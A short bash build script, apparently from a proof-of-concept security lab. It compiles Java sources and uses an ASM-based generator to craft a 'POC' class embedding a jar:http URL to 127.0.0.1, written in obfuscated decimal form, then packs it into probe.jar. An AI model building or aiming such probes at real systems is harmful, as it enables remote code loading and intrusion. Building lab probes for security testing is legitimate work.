#!/usr/bin/env bash
set -euo pipefail

root_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "${root_dir}"

scripts/fetch-deps.sh

mkdir -p target/classes target/crafted

javac_bin="${JAVAC:-javac}"
java_bin="${JAVA:-java}"
jar_bin="${JAR:-jar}"

if "${javac_bin}" --help 2>&1 | grep -q -- "--release"; then
  compile_level=(--release 8)
else
  compile_level=(-source 8 -target 8)
fi

"${javac_bin}" "${compile_level[@]}" -encoding UTF-8 -cp "lib/*" -d target/classes src/main/java/*.java
"${java_bin}" -cp "target/classes:lib/asm-9.6.jar" Gen \
  "jar:http://2130706433:18080/probe!/POC" \
  target/crafted-POC.class
cp target/crafted-POC.class target/crafted/POC.class
"${jar_bin}" cf probe.jar -C target/crafted POC.class

echo "[build] classes compiled under target/classes"
echo "[build] crafted probe jar written to probe.jar"
